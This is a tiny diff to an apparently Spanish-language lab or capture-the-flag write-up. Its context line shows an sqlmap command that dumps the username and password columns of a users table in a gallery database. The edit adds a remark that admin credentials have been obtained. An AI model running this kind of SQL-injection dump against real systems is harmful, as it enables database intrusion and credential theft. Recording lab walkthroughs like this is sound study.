@@ -78,4 +78,5 @@ sqlmap -r phpid.txt -D gallery_db -T users --columns users -C username,password 
 ```
 
 ![[Pasted image 20240112224808.png]]
-tenems
+tenemos credenciales del usuario admin
+
